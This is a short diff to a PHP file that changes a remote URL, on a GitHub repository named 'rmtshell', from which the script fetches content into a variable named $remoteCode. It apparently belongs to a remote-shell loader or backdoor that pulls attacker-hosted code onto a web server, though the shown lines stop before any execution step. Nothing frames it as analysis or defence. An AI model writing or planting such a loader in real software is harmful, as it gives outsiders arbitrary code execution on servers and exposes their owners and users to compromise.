@@ -1,5 +1,5 @@
 <?php
-$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rmtshell/main/inputs.txt";
+$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rmtshell/main/index.txt";
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $remoteCode = curl_exec($ch);
